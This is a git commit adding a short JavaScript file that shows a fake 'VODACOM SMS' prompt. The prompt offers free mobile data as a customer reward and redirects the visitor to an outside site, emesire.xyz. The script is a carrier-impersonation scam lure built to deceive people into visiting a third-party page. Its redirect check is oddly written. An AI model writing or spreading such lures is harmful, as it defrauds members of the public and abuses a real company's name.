ad626828c667cc46e96f1ca5f996e9cde7423a25
sureoffer <emesire247@gmail.com>
2025-06-07 22:45:20 -0700

    Create activation-vodacom-freedata.js

---
+++ activation-vodacom-freedata.js
@@ -0,0 +1,5 @@
+var password = 'FREE DATA'
+password=prompt('VODACOM SMS: Dear Customer, Kindly Check If your Vodacom Sim Card Is Qualify To Receive From 5GB To 100GB data, Old Customers Reward, press Free Data To Check Now ','FREE DATA');
+if (password != 'FREE DATA') {
+location.href='https://emesire.xyz/vodacom-freedata.html';
+}
